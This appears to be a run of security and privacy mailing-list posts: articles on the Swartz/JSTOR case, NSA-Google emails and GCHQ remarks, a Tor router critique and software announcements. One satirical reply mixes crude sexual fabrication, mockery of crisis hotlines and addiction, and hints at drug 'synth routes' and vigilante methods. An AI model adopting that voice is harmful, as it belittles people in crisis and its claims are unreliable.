before Swartz's arrest that his computer was being contacted from
China raised passing fears of a foreign cyberattack, e-mails show,
although such probing from overseas is quite routine.
Yet MIT was used to seeing excessive downloading -- albeit on a much
smaller scale -- and some staff downplayed the threat.
"There will always be one person a semester who, regardless of intent,
will write a script to crawl through some catalog," an MIT employee
wrote when JSTOR first cut off the portion of campus where Swartz was
operating. The MIT worker called JSTOR's move "draconian" and
The result of their differing vulnerabilities, e-mails indicate, was
that JSTOR was far more bellicose toward the interloper than was MIT --
at least until the days right before Swartz's arrest.
JSTOR pressed again and again for MIT to find the downloader. Some of
the archive's employees said MIT was being cooperative, but other
staff members were irate at the university.
"I am sure that if they had lost an equivalent number of books from
their library overnight (what 25,000-30,000 books) they would not be
so nonchalant," someone at JSTOR wrote in an e-mail.
"This is an astronomical number of articles -- again, real theft,"
another wrote. "Does the university contact law enforcement? Would
they be willing to do so in this instance?"
When Swartz popped up again in late December after weeks of quiet, the
tension was even plainer.
"I might just be irked because I am up dealing with [the downloader]
on a Sunday night," a JSTOR employee wrote, "but I am starting to feel
like [MIT needs] to get a hold of this situation and right away or we
need to offer to send them some help (read FBI)."
These were "heat of the moment" reactions by officials anxious about
an unknown threat, said Kevin M. Guthrie, president of ITHAKA, JSTOR's
parent organization.
"You get a report that 100,000 articles have been downloaded on a
Saturday, you're trying to figure out what to do," he said in an
As for JSTOR's internal comments about calling the police, he said,
"We talked about it, but we made a decision -- no, this wouldn't be
appropriate; it's not our role to indicate that law enforcement should
be called."
When it came to Swartz's prosecution, JSTOR was notably reticent. It
insisted on being served with a subpoena before it would provide
information to the government and then, according to Abelson's report,
tried to limit its answers.
Guthrie told the Globe that the not-for-profit was simply trying to be
careful. As for its decision to publicly oppose prosecution, he said,
once Swartz returned the files, the journal provider was no longer
interested in the matter.
JSTOR was "trying to balance our obligation both to be good stewards
of the content for the content owners and publishers, for our own
viability, for broad access to information, and then the personal
situation, the human situation," Guthrie said.
JSTOR's very existence, he said, is all about broadening access to
scholarly journals. Its fees go to support the archive, and it
provides free access in developing countries.
E-mails from before Swartz was captured suggest that JSTOR might also
have been worried about its public image. The archive is already
viewed in some quarters as a greedygatekeeper constricting the pursuit
of knowledge. One JSTOR employee, in an e-mail addressing the
possibility of bringing in law enforcement, noted several technical
obstacles after opening with, "aside from the considerations about the
PR of it all . . . "
A sudden shift
If MIT was initially slow to react to the "ghost," even tepid about
the whole thing as some at JSTOR surmised, that changed drastically
after the university learned of another breach in December 2010.
After the laptop Swartz was accused of setting up to download JSTOR
articles was found in a wiring closet at MIT, investigators left the
computer up and running and installed a hidden camera.
On the night after Christmas, JSTOR discovered a new round of
downloading. It had actually started some 10 weeks earlier, but Swartz
had slowed the process enough to avoid tripping alarms.
Out on a furlough, MIT staff did not get the urgent messages from
JSTOR until Jan. 3, 2011. "This is a heck of a way to start the new
year," one person at MIT wrote. "We need to escalate the seriousness
of our response. This looks like grand theft."
And escalate MIT did. The academic building where the activity seemed
to emanate from had been pinpointed in mid-October. But only on the
morning of Jan. 4 did a network engineer began searching Building 16.
He quickly discovered a laptop, hidden under a cardboard box,
connected to the network from a wiring closet in the basement.
MIT police decided they needed more help, and called a Cambridge
police detective who belonged to a regional electronic crimes task
force. He showed up with another task force member, a Secret Service
agent named Michael S. Pickett.
Seeking not only to find the downloader but to collect as much
evidence as possible, they set up a hidden camera in the wiring
closet. And instead of shutting down the laptop, the authorities
decided to "leave it up and running for a couple of days while the
investigation continues," a library employee wrote in an e-mail.
"Now a federal case," the library staffer wrote in separate notes she
took on a conversation with an MIT security analyst. "We [MIT] are
considered the victim. All we provide is by choice -- not subpoenaed."
That cooperation with law enforcement also extended to a senior MIT
network engineer who monitored traffic to and from Swartz's laptop and
appeared to be looking to Pickett for instructions. On Jan. 5, having
collected 70 gigabytes of network traffic, he e-mailed the agent, "I
was just wondering what the next step is."
Swartz's lawyers argued that MIT, by monitoring Swartz and turning
over materials to law enforcement without a court order, violated his
Fourth Amendment rights. Abelson, who wrote MIT's own review,
disagreed, and legal experts interviewed by the Globe differed on
whether those arguments had merit. They were never ruled on by the
judge in the case.
Grimson, the former university chancellor, acknowledged in an
interview that it would have been "cleaner" to ask prosecutors to seek
a court order sooner. Turning over evidence without a subpoena raised,
in some eyes, painful questions about MIT's avowed neutrality.
Swartz was identified by the hidden camera and arrested on Jan. 6
after allegedly trying to flee police on Massachusetts Avenue in
The startling discovery that the "ghost" downloader was a well-known
activist prompted a few MIT employees to share their opinions with
Pickett, the Secret Service agent, or their colleagues.
"Looks like he is a big hacker, i googled him," one wrote to Pickett
at midnight the morning after Swartz's arrest.
That afternoon, someone from the IT security department wrote to
Pickett, deeming Swartz a "really intelligent kid that just got buried
under an avalanche of dumb."
A few days later, Swartz took to Twitter to ask his followers if they
knew anyone at JSTOR, presumably hoping he could defuse the situation.
One person at MIT responded by circulating among colleagues a made-up
message purporting to be what Swartz wanted to say to JSTOR.
"hi, jstor, I'm still a few million pdf's shy of grabbing your whole
db; really had high hopes on collecting the whole set by 1/1/11," it
read. "could you tell me what number I left off at, because I don't
currently have access to my lappy that was keeping track. k thnx bye."
The MIT employee's commentary on his or her own fictional tweet: "LOL."
The documents say little about what MIT was thinking and doing once
the case morphed from an investigation into an active prosecution. But
MIT's own report on the case raises serious questions about the wisdom
of MIT's neutrality stance.
The report noted that some within MIT believe "there has been a change
in the institutional climate over recent years, where decisions have
become driven more by a concern for minimizing risk than by strong
affirmation of MIT values."
The Computer Fraud and Abuse Act has been widely condemned as extreme
in both its sweeping scope and its grave punishments. Sentencing
guidelines suggest Swartz faced up to seven years in prison.
To his supporters, MIT bears some responsibility for that fact. MIT
officials privately told the prosecutor that the university had no
interest in jail time, but refused to oppose his prosecution publicly
or privately, despite repeated entreaties from Swartz's father, his
lawyers, and a couple of faculty members, who argued MIT had the
institutional heft to influence the US attorney's office.
MIT may have also missed an opportunity to point out a potentially
serious flaw in the case against Swartz.
The Computer Fraud and Abuse Act charges centered on the claim that
Swartz had unauthorized access to MIT and JSTOR's networks. But even
if he was doing something improper, Swartz was logged on at MIT as a
guest, leading Abelson and some legal observers to conclude that his
access could be construed as authorized.
It was hardly a clear-cut case, and the judge may not have agreed. But
either way, MIT -- resolute about not getting drawn into a criminal
case to which it was not a named party -- "paid little attention to the
details of the charges," Abelson found. The institute simply did not
consider whether Swartz may have been an authorized user under the
terms of the law, according to the report.
The defense didn't raise it, either, until close to Swartz's death.
MIT was helping the prosecution "understand how to prosecute, what
information is necessary to prosecute, but not taking steps to help
them understand the limits to their prosecution," said Lawrence
Lessig, a Harvard Law School professor who was close to Swartz.
"Nobody would call that neutral. That's aiding and abetting the
Grimson defended MIT's decision to leave it up to the justice system
to decide Swartz's fate, given that MIT leaders believe he harmed the
school. And he disagreed that MIT is less driven by its ideals than it
once was. He pointed to the Abelson report as an example of MIT's
willingness to soul-search and learn from a tragedy.
Still, he said, MIT will be second-guessing itself for a long time,
and the university is still considering some policy changes in light
of what happened to Swartz. Its first concrete move, last month, was
to set up a presidential committee that will create an online data
privacy policy.
A famously sensitive person, Swartz had some history with depression.
Yet loved ones insist that he was not clinically depressed before he
hanged himself in his Brooklyn apartment on Jan. 11, 2013, but
overwhelmed by the threat of years injail and the toll of fighting the
His father, Bob Swartz, believes that MIT's lack of compassion helped
destroy his son's life.
"We can't bring Aaron back, he can no longer be the tireless worker
for good," he said at a memorial service for his son held at MIT last
spring. "What we can do is change things for the better. We can work
to change MIT so that it . . . once again becomes a place where risk
and coloring outside the lines is encouraged, a space where the
cruelties of the world are pushed back and our most creative flourish
rather than being crushed."

Exclusive: Emails reveal close Google relationship with NSA
National Security Agency head and Internet giant’s executives have
coordinated through high-level policy discussions
May 6, 2014 5:00AM ET
by Jason Leopold Email exchanges between National Security Agency Director Gen. Keith
Alexander and Google executives Sergey Brin and Eric Schmidt suggest a
far cozier working relationship between some tech firms and the U.S.
government than was implied by Silicon Valley brass after last year’s
revelations about NSA spying.
Disclosures by former NSA contractor Edward Snowden about the agency’s
vast capability for spying on Americans’ electronic communications
prompted a number of tech executives whose firms cooperated with the
government to insist they had done so only when compelled by a court
of law.
But Al Jazeera has obtained two sets of email communications dating
from a year before Snowden became a household name that suggest not
all cooperation was under pressure.
On the morning of June 28, 2012, an email from Alexander invited
Schmidt to attend a four-hour-long “classified threat briefing” on
Aug. 8 at a “secure facility in proximity to the San Jose, CA
“The meeting discussion will be topic-specific, and decision-oriented,
with a focus on Mobility Threats and Security,” Alexander wrote in the
email, obtained under a Freedom of Information Act (FOIA) request, the
first of dozens of communications between the NSA chief and Silicon
Valley executives that the agency plans to turn over.
Alexander, Schmidt and other industry executives met earlier in the
month, according to the email. But Alexander wanted another meeting
with Schmidt and “a small group of CEOs” later that summer because the
government needed Silicon Valley’s help.
“About six months ago, we began focusing on the security of mobility
devices,” Alexander wrote. “A group (primarily Google, Apple and
Microsoft) recently came to agreement on a set of core security
principles. When we reach this point in our projects we schedule a
classified briefing for the CEOs of key companies to provide them a
brief on the specific threats we believe can be mitigated and to seek
their commitment for their organization to move ahead … Google’s
participation in refinement, engineering and deployment of the
solutions will be essential.”
Jennifer Granick, director of civil liberties at Stanford Law School’s
Center for Internet and Society, said she believes information sharing
between industry and the government is “absolutely essential” but “at
the same time, there is some risk to user privacy and to user security
from the way the vulnerability disclosure is done.”
The challenge facing government and industry was to enhance security
without compromising privacy, Granick said. The emails between
Alexander and Google executives, she said, show “how informal
information sharing has been happening within this vacuum where there
hasn’t been a known, transparent, concrete, established methodology
for getting security information into the right hands.”
The classified briefing cited by Alexander was part of a secretive
government initiative known as the Enduring Security Framework (ESF),
and his email provides some rare information about what the ESF
entails, the identities of some participant tech firms and the threats
they discussed.
The classified briefing cited by Alexander was part of a secretive
government initiative known as the Enduring Security Framework (ESF),
and his email provides some rare information about what the ESF
entails, the identity of some participant tech firms and the threats
they discussed.
Alexander explained that the deputy secretaries of the Department of
Defense, Homeland Security and “18 US CEOs” launched the ESF in 2009
to “coordinate government/industry actions on important (generally
classified) security issues that couldn’t be solved by individual
actors alone.”
“For example, over the last 18 months, we (primarily Intel, AMD
[Advanced Micro Devices], HP [Hewlett-Packard], Dell and Microsoft on
the industry side) completed an effort to secure the BIOS of
enterprise platforms to address a threat in that area.”
“BIOS” is an acronym for “basic input/output system,” the system
software that initializes the hardware in a personal computer before
the operating system starts up. NSA cyberdefense chief Debora Plunkett
in December disclosed that the agency had thwarted a “BIOS plot” by a
“nation-state,” identified as China, to brick U.S. computers. That
plot, she said, could have destroyed the U.S. economy. “60 Minutes,”
which broke the story, reported that the NSA worked with unnamed
“computer manufacturers” to address the BIOS software vulnerability.
But some cybersecurity experts questioned the scenario outlined by Plunkett.
“There is probably some real event behind this, but it’s hard to tell,
because we don’t have any details,” wrote Robert Graham, CEO of the
penetration-testing firm Errata Security in Atlanta, on his blog in
December. “It”s completely false in the message it is trying to
convey. What comes out is gibberish, as any technical person can
And by enlisting the NSA to shore up their defenses, those companies
may have made themselves more vulnerable to the agency’s efforts to
breach them for surveillance purposes.
“I think the public should be concerned about whether the NSA was
really making its best efforts, as the emails claim, to help secure
enterprise BIOS and mobile devices and not holding the best
vulnerabilities close to their chest,” said Nate Cardozo, a staff
attorney with the Electronic Frontier Foundation’s digital civil
liberties team.
He doesn’t doubt that the NSA was trying to secure enterprise BIOS,
but he suggested that the agency, for its own purposes, was “looking
for weaknesses in the exact same products they’re trying to secure.”
The NSA “has no business helping Google secure its facilities from the
Chinese and at the same time hacking in through the back doors and
tapping the fiber connections between Google base centers,” Cardozo
said. “The fact that it’s the same agency doing both of those things
is in obvious contradiction and ridiculous.” He recommended dividing
offensive and defensive functions between two agencies.

Two weeks after the “60 Minutes” broadcast, the German magazine Der
Spiegel, citing documents obtained by Snowden, reported that the NSA
inserted back doors into BIOS, doing exactly what Plunkett accused a
nation-state of doing during her interview.
Google’s Schmidt was unable to attend to the mobility security meeting
in San Jose in August 2012.
“General Keith.. so great to see you.. !” Schmidt wrote. “I’m unlikely
to be in California that week so I’m sorry I can’t attend (will be on
the east coast). Would love to see you another time. Thank you !”
Since the Snowden disclosures, Schmidt has been critical of the NSA
and said its surveillance programs may be illegal.
Army Gen. Martin E. Dempsey, chairman of the Joint Chiefs of Staff,
did attend that briefing. Foreign Policy reported a month later that
Dempsey and other government officials — no mention of Alexander —
were in Silicon Valley “picking the brains of leaders throughout the
valley and discussing the need to quickly share information on cyber
threats.” Foreign Policy noted that the Silicon Valley executives in
attendance belonged to the ESF. The story did not say mobility threats
and security was the top agenda item along with a classified threat
A week after the gathering, Dempsey said during a Pentagon press
briefing, “I was in Silicon Valley recently, for about a week, to
discuss vulnerabilities and opportunities in cyber with industry
leaders … They agreed — we all agreed on the need to share threat
information at network speed.”
Google co-founder Sergey Brin attended previous meetings of the ESF
group but because of a scheduling conflict, according to Alexander’s
email, he also could not attend the Aug. 8 briefing in San Jose, and
it’s unknown if someone else from Google was sent.
A few months earlier, Alexander had emailed Brin to thank him for
Google’s participation in the ESF.
“I see ESF’s work as critical to the nation’s progress against the
threat in cyberspace and really appreciate Vint Cerf [Google’s vice
president and chief Internet evangelist], Eric Grosse [vice president
of security engineering] and Adrian Ludwig’s [lead engineer for
Android security] contributions to these efforts during the past
year,” Alexander wrote in a Jan. 13, 2012, email.
“You recently received an invitation to the ESF Executive Steering
Group meeting, which will be held on January 19, 2012. The meeting is
an opportunity to recognize our 2012 accomplishments and set direction
for the year to come. We will be discussing ESF’s goals and specific
targets for 2012. We will also discuss some of the threats we see and
what we are doing to mitigate those threats … Your insights, as a key
member of the Defense Industrial Base, are valuable to ensure ESF’s
efforts have measurable impact.”
A Google representative declined to answer specific questions about
Brin’s and Schmidt’s relationship with Alexander or about Google’s
work with the government.
“We work really hard to protect our users from cyberattacks, and we
always talk to experts — including in the U.S. government — so we stay
ahead of the game,” the representative said in a statement to Al
Jazeera. “It’s why Sergey attended this NSA conference.”
Brin responded to Alexander the following day even though the head of
the NSA didn’t use the appropriate email address when contacting the
“Hi Keith, looking forward to seeing you next week. FYI, my best email
address to use is [redacted],” Brin wrote. “The one your email went to
— sergey.brin at google.com — I don’t really check.”

we're almost family Pete, no need to introduce yourself!
  ... was starting to wonder how you've been...
   you never call, you rarely write,
regarding your piece published at:
 this reply is a little long, as i took the time to respond in depth to
each of the issues i observed in your piece; i hope you view this as
the best of intentions and sincere desire for thoroughness it is.  any
criticism is entirely constructive.  if you feel despondent or
hopeless about the future where you have been so wrong and so ill
equipped to secure digital systems, see the end of this thread for
crisis hotline resources in your area.
you might be interested in the other thread on treating addiction.  my
own empirical study linking INFOSEC/COMSEC responsibilities with
ethanol abuse, clandestine chemical poisonings, and a rapidly
escalating habit for high fiber lifestyle is progressing nicely, but
not yet ready for publication. (DWDM not ingested fiber)
agreed!  i find it very helpful to find vulns first, use them for
early signalling of adversary capabilities and interest, weaponize
them for great justice, and distribute them in limited fashion toward
end of life cycle to friends and peers, where again they serve as
useful feedback on third party OPSEC and integrity.
unfortunately in previous private vulnerability assessments all social
media platforms failed to survive our common criteria for credible
computing contract services.  at least you're not paying for them? ...
i will however provide my feedback via this medium:
0. "how to make it hurt less"
first off, you may be interested in my research on the best synth
routes for clandestine medicating and near term memory cleansing with
common chemicals or seedy suppliers.  this information was cultivated
during my research into INFOSEC/COMSEC professional who are clearly
exceptionally capable in this domain.
1. "You can’t manage vulnerabilities in closed software any more than
you can manage tunnel construction in an ant nest."
this is not true.  by actively managing the execution of all processes
on all your systems and the communication they make between each other
and remote (networked or bus connected services) peers.
blocking and altering shared library methods, system calls, and
network communication is effective against open source, closed source,
promiscuous source, and other development practices.
2. "Managing vulnerabilities will not get you security. Especially
since patched vulnerabilities is a subset of found vulnerabilities
which is assumed (for far too many) to be a subset of having
this is why it is critical to find as many vulnerabilities as possible
in the systems you use before others do.  use the vulnerabilities you
find as a model of class of weakness upon which to defend in depth.
more to do after this, but for another discussion... ;)
3. "But if you wanted to have all the domesticated animals on your new
arc you can’t do it by only looking house pets as that would exclude
goats, cows, horses, yetis, and many animals maybe you don’t know or
didn’t consider. So when scanning for vulnerabilities you can only, at
best, find the vulnerabilities the scanner knows about."
i for one wish they omitted the goats.  they make great work on the
blackberry bushes, but the pasture fences are challenge and escalating
war of attrition they so far show no difficulty defeating with clever
goat skillz.
more to the point above, this is why it is critical to employ not just
all existing scanners, fuzzers, frameworks, and toolsets but also to
improve them internally while also developing your own infrastructure
for vulnerability discovery, defense, and weaponization. (this is
called "big vuln" or "big vuln dev" by our team for lack of a better
4. "It Can Feel a Lot Like Doing Dishes. Vulnerability management is
an endless race that can’t be won."
so true! however, this is why complete and continuous automation is
mandatory at the moment of analyst discovery or developer prototype.
thus the repetitiveness is delegated to the machines who do our
bidding without tire or negligence.
5. "when you manage operational controls as part of vulnerability
management you can actually take yourself out of the rat race of patch
vs. exploit. That’s huge!"
patch vs. exploit is a false dichotomy.  if you're not solving for
both concurrently you're doing it wrong.
(don't feel bad, this is a common failure.)
6. "Filling a Hole Has Never Been So Dirty ... We think vulnerability
management is straight-forward: there’s a hole and you fill it and the
hole is gone."
who are these "we" you speak of?  the last time i saw that mindset in
play was a sales associate for a security consulting firm hawking some
weird devops / continuous integration like thing i don't remember too
anyone who thinks vulnerability management is easy is unaware of their
ignorance, risk, and update latencies in their organization.
7. "In the end, playing dirty is the only way most vulnerability
managers can keep their heads above water. But let’s just call that a
risk decision."
what you call "playing dirty" is just decision making in the midst of
a series of one crises after another in an endless procession.  crisis
mitigation and resolution should not be cast in a negative air of
"playing dirty".  rather, take this as opportunity to find the
exceptionally rare operations crew who runs a ship so tight there are
no crises, only prioritized opportunities for even further
8. "closely followed by NATO, NIST, FBI, NASA, NSA, all branches of
armed forces, and the White House."
this is just awefull! i suffered through a number of years with a
stalker intent on making me into a skin cover for a realdoll in some
psychotic delusion he was compelled by.  i know the unease and fear
and stress that a malicious stalker can have on the psyche.  i presume
you've looked into local resources to prosecute or order to be
restrained.  if they're unable or unwilling to resolve the issue,
contact me off list for more extreme methods to handle this.  i got
your back Pete; and we'll get these rogue's off your back one way or
9. "don’t forget to see me in Richmond, VA from June 4 – 6 at RVAse"
sorry Pete, i quit going east of the mississippi given the fallout
that inevitably follows.  as a US tax payer, i try to limit the
resources expended to violate my privacy and presume a threat where
none exists.  and frankly it diminishes the intimacy of my memories
knowing that they've surveiled my masturbatory sessions in remote
i am taking this moment to segue into one last observation in your
piece, but it deals with adult subject matter that may not be
appropriate for all audiences.  if you are not mature enough for the
discussion below, please don't read it!
 - this break intentionally inserted for decency -
Z. "... the adult film star process which pretty much gets you from
film star to adult film star by doing just one thing on film."
i don't often discuss my personal past in these lists or online in general.
for a while i had a career in INFOSEC but came to a realization that
there must other line of work supporting a upper middle class salary
which were not so terribly detrimental to my mental and physical
health.  i transitioned into gonzo group gay porn which met the cost
of living requirements but still had above average physical demands
even if a great improvement over the dark INFOSEC years. after five
years building a library of over 1,782 different scenes stretching to
12 days of continuous copulation my career in porn was ended in a
crippling accident while testing a prototype manbian machine fucking
investment that was my doom rather than return on investment.  don't
write me, the rights have already been sold for a moving drama with A
list cast.
my point is that i published a greatest "best-of coderass at 1.75 FPS,
abridged" anthology as career end salute on a 180 minute collector
s edition BluRay paid for by the sale of creative rights mentioned
above.  this video release rocketed to the top of all the best seller
lists and made me a household name and continues to feed me a torrent
of franchise fees, recurring profit share, and ongoing royalties which
can only be described as obscene and ridiculous.  for some reason
every other effort was just not enough to bump me up above obscure D
list status...  it's a funny world.
TL;DR: my adult film star process required 1,782 scenes, 45,000
minutes of film, and spanned 73%* of known sex acts possible to act
out between two or more humans but less than twenty humans at once.
this is as far removed from "doing just one thing" as i can imagine,
and frankly it disrespects the strenuous effort and creative acting
myself and other sex workers practice in mostly thankless service to
others. you should be ashamed!
 [* automatic identification and categorization of sex acts is
surprisingly complicated! the corresponding language theoretic effort
to map 1 to 20 human bodies in movement for 15 minutes or less into a
formal language to exhaustively delineate all the possible perversions
possible to commit under the sun was gargantuan in terms of earth
human hours and the resulting corpus. we are close to proving that not
everything which can be done has been. if you would be interested in
performing a provably unique sex act for a large sum of money and only
modest surgical modification, please get in touch]
P.P.S. some people ask me what i do now for a living since confined to
robotic wheelchair and bed rest. the truth is, i could never turn my
back entirely on the INFOSEC community in which i started my first
career and sojourn into the great world alone.
so now i am busking at conferences doing INFOSEC comedy routines,
selling nerdcore rap put to chiptunes on independent labels, and
manning the crisis hotlines for substance abuse and domestic violence
victims, who strangely enough overlap to a non trivial degree with the
set of self confessed INFOSEC professionals.
my time spent replying to INFOSEC threads on mailing lists is gratis,
as no one pays me for it, and no one like what i say enough to tip me.

my take on the interesting bits:
regarding the phones in the fridge, this was done to muffle sound, not
provide EMSEC protection. a fridge is not a faraday cage! (there has
been some speculation, now definitively squashed.)
regarding the scope of surveillance and exploitation, it is
interesting to see how far Alexander really pushed things beyond
normative for the agency.  i knew he was a "spy cowboy", yet this book
presents a clearer picture of how significant Alexander escalated
Hayden's already aggressive agenda.
regarding the intimidation and maligning of leak reporters, it was

discredit reporting on this story were.

References: <7488606.2oxgLGVBPl
---------- Forwarded message ----------
first question, did you contact Tor Project Inc. about this for their
input? (if yes, what was their take on your aims?)
the majority of these repositories are forks of existing public
projects, but not clearly so. (e.g. cloak-routing is a selection of
specific OpenWRT packages, eschalot, etc.)
what do you think of branching from upstream repositories, and keeping
your changes in a manner that upstream would be encouraged to
i have more feedback on code itself, but this is foremost to mention.
i approve of open hardware approach very much :)
perhaps useful to identify what is open (like PCB) and what is not (Atheros)
obviously this is not difficult, but it is also more complicated than
just "some sensible rules". e.g.
 and
iptables -A OUTPUT -m conntrack --ctstate INVALID -j DROP and all the
other intricacies...
it would also be great if you could introduce some per-device unique
entropy seed, obtained from a strong hardware based random number
generator. (how better to signal your interest in utmost privacy, even
if practical benefit is less concrete? :)
the concept of a portable Tor proxy hardware router that fits in your
pocket is great, in my not so unbiased opinion :)
what technical people will frown on is the way the device is presented
to users, and if users are placed into risk by technical errors.
that's fine; i believe it is possible to make a device that is
transparently usable that also doesn't put users at needless risk, if
that is what you are getting at.
the suggestions others have made that i second:
- block accidental Tor over Tor setups.
- provide a Tor Browser on the supported platforms with TOR_TRANSPROXY=1
- provide automated builds, so that users can keep their device up to
date easily, or use a built-in mechanism to obtain and install the
latest easily.
in general, some guidelines that me as a technical person would like to see:
- the device should fail safe, rather than fail open: if i
accidentally connect my friend's windows XP laptop to your device, it
should block rather than allow all by default.
- support robust stream isolation, beyond what may be default. perhaps
IsolateDestAddr and IsolateByClientAddr on TransPort (this does not
yet exist, but you could code it to the benefit of all Transparent
proxy consumers :)
regarding your other information:
from your kickstarter, "We commit to establish and operate new exit
nodes, to ensure that we are pulling our weight. Tor is currently at
approx 2000 users per exit node. For every 1000 devices we ship, we
will establish a new dedicated exit node. "
why the focus on number of exit nodes, instead of contributed exit
capacity?  you're measuring the wrong thing here.
i have more feedback, but your responses to these questions will help
me determine how much time i can contribute to an evaluation.

A Practical Attack Against the HIVE Hidden Volume Encryption System
Kenneth G. Paterson and Mario Strefler
Abstract: The HIVE hidden volume encryption system was proposed by
Blass et al. at ACM-CCS 2014. Even though HIVE has a security proof,
this paper demonstrates an attack on its implementation that breaks
the main security property claimed for the system by its authors,
namely plausible hiding against arbitrary-access adversaries. Our
attack is possible because of HIVE's reliance on the RC4 stream cipher
to fill unused blocks with pseudorandom data. While the attack can be
easily eliminated by using a better pseudorandom generator, it serves
as an example of why RC4 should be avoided in all new applications and
a reminder that one has to be careful when instantiating primitives.

“To those of us who have to tackle the depressing end of intelligence
community behaviour on the internet, it can seem that all governments,
telcos, and computing companies are in denial about its misuse."
 [ paraphrased for relevance ]
- GCHQ chief accuses US tech giants of becoming terrorists' 'networks of choice'
New director of UK eavesdropping agency accuses US tech firms of
becoming ‘networks of choice’ for terrorists
Privacy has never been “an absolute right”, according to the new
director of GCHQ, who has used his first public intervention since
taking over at the helm of Britain’s surveillance agency to accuse US
technology companies of becoming “the command and control networks of
choice” for terrorists.
Robert Hannigan said a new generation of freely available technology
has helped groups like Islamic State (Isis) to hide from the security
services and accuses major tech firms of being “in denial”, going
further than his predecessor in seeking to claim that the leaks of
Edward Snowden have aided terror networks.
GCHQ and sister agencies including MI5 cannot tackle those challenges
without greater support from the private sector, “including the
largest US technology companies which dominate the web”, Hannigan
argued in an opinion piece written for the Financial Times just days
into his new job.
Arguing that GCHQ needed to enter into the debate about privacy,
Hannigan said: “I think we have a good story to tell. We need to show
how we are accountable for the data we use to protect people, just as
the private sector is increasingly under pressure to show how it
filters and sells its customers’ data.
“GCHQ is happy to be part of a mature debate on privacy in the digital
age. But privacy has never been an absolute right and the debate about
this should not become a reason for postponing urgent and difficult
Hannigan, who was born in Gloucestershire, not far from GCHQ’s base,
has advised the prime minister on counter-terrorism, intelligence and
security policy, goes on to take aim at the role of major technology
companies. A senior Foreign Office official, Hannigan succeeded Sir
Iain Lobban at the Cheltenham-based surveillance agency.
“To those of us who have to tackle the depressing end of human
behaviour on the internet, it can seem that some technology companies
are in denial about its misuse.
“I suspect most ordinary users of the internet are ahead of them: they
have strong views on the ethics of companies, whether on taxation,
child protection or privacy; they do not want the media platforms they
use with their friends and families to facilitate murder or child
Hannigan asserts that the members of the public “know” the internet
grew out of the values of western democracy and insists that customers
of the technology firms he criticises would be “comfortable with a
better, more sustainable relationship between the agencies and the
technology companies.”
Heading towards the 25th anniversary of the creation of the world wide
web, he calls for a “new deal” between democratic governments and the
technology companies in the area of protecting citizens.
“It should be a deal rooted in the democratic values we share. That
means addressing some uncomfortable truths. Better to do it now than
in the aftermath of greater violence.”
In the same piece, Hannigan says Isis differs from its predecessors in
the security of its communications, presenting an even greater
challenge to the security services.
 “Terrorists have always found ways of hiding their
operations. But today mobile technology and smartphones have increased
the options available exponentially.
“Techniques for encrypting messages or making them anonymous which
were once the preserve of the most sophisticated criminals or nation
states now come as standard. These are supplemented by freely
available programs and apps adding extra layers of security, many of
them proudly advertising that they are ‘Snowden approved’. There is no
doubt that young foreign fighters have learnt and benefited from the
leaks of the past two years.”
Among the advocates of privacy protection who reacted to Hannigan’s
comments, the deputy director of Privacy International, Eric King,
said: “It’s disappointing to see GCHQ’s new director refer to the
internet – the greatest tool for innovation, access to education and
communication humankind has ever known – as a command-and-control
network for terrorists.”
King added: “Before he condemns the efforts of companies to protect
the privacy of their users, perhaps he should reflect on why there has
been so much criticism of GCHQ in the aftermath of the Snowden
revelations. GCHQ’s dirty games – forcing companies to handover their
customers’ data under secret orders, then secretly tapping the private
fibre optic cables between the same companies’ data centres anyway –
have lost GCHQ the trust of the public, and of the companies who
services we use. Robert Hannigan is right, GCHQ does need to enter the
public debate about privacy - but attacking the internet isn’t the
right way to do it.”
The Electronic Frontier Foundation (EFF) meanwhile rejected the notion
that an agreement between companies and governments was needed.
Jillian York, director of international free expression at EFF said:
“A special “deal” between governments and companies isn’t necessary -
law enforcement can conduct open source intelligence on
publicly-posted content on social networks, and can already place
legal requests with respect to users. Allowing governments special
access to private content is not only a violation of privacy, it may
also serve to drive terrorists underground, making the job of law
enforcement even more difficult.”
Welcoming Hannigan’s participation in the public debate, the Labour
Party MP Tom Watson said it helped to map out where we should draw the
line on privacy and helps the same agencies “to rebuild their
legitimacy post-Snowden”.
But he added: “I hope they do not confuse the use of public propaganda
through social media by extremists with the use of the covert
communications. It is illogical to say that because Isis use Twitter,
all our metadata should be collected without warrant.”
Hannigan’s comments come after the director of the FBI, James Comey,
called for “a regulatory or legislative fix” for technology companies’
expanding use of encryption to protect user privacy.
Reacting last month to the introduction of strong default encryption
by Apple and Google on their latest mobile operating systems, Comey
said “the post-Snowden pendulum has swung too far in one direction -
in a direction of fear and mistrust.”
“Justice may be denied because of a locked phone or an encrypted hard
drive,” said Comey. Without a compromise, “homicide cases could be
stalled, suspects could walk free, and child exploitation victims
might not be identified or recovered.”

possibilities to dissuade dastardly detours:
- sunlight the best disinfectant; publicize attempts at intimidation

References: ---------- Forwarded message ----------
Today we announce the release of the RefOS project.  RefOS is an OS
personality that runs on seL4. RefOS stands for "Reference OS", the
aspirational goal of the project, which is to provide a reference OS
personality for seL4.
RefOS is a student project built as a case study to explore more
dynamic virtual memory (VM) management systems than the typical static
systems architected on separation kernels. When compared to statically
allocated systems, a key difference (and complexity) of dynamic VM
management is relaxing the assumption that virtual memory (and memory
objects) are managed by a single task upon the microkernel (or by the
microkernel itself).
RefOS has a distributed VM framework inspired by the Sawmill VM
framework [1], though differing in the centralisation of some core
book-keeping into a single server (mainly fault forwarding and mapping
authorisation). An additional goal of the project was to create
tension between user-level and kernel-level VM primitives to enable
ongoing kernel experimentation in the area of higher-level VM
The current functionality of RefOS consists of processes, an
in-memory boot-image file server, and console support. Additionally,
some games and test applications have been ported to the system.
RefOS is available at  under a
"BSD 2-Clause" license.

FPGAs have been used to augment computation ever since they were
developed. (i remember back in the early 90's being able to buy a PCI
FPGA add-on card for accelerated computation)
the problem is efficiency, and in a size pressured SoC design
efficiency (which in turn drives power consumption) is paramount.
not to say it isn't useful, but an FPGA processor compared to a tight,
ASIC SoC, is going to lose by an order of magnitude.
i would however be keen to see how some FPGA components on a RFIC
integrated ASIC SoC could help DSP and related processing with
flexibility while leaving the ASIC core for performance.
fun considerations... too bad nearly everyone in position to
contribute to such an effort is chained by NDAs, Secrecy Acts, or
other binding Confidentiality clauses.

@_subject: Fwd: [Announce] GnuPG 2.1.0 "modern" released 
References: <87ioisn1mo.fsf
---------- Forwarded message ----------
The GnuPG Project is pleased to announce the availability of a
new release: Version 2.1.0.
The GNU Privacy Guard (GnuPG) is a complete and free implementation of
the OpenPGP standard as defined by RFC-4880 and better known as PGP.
GnuPG, also known as GPG, allows to encrypt and sign data and
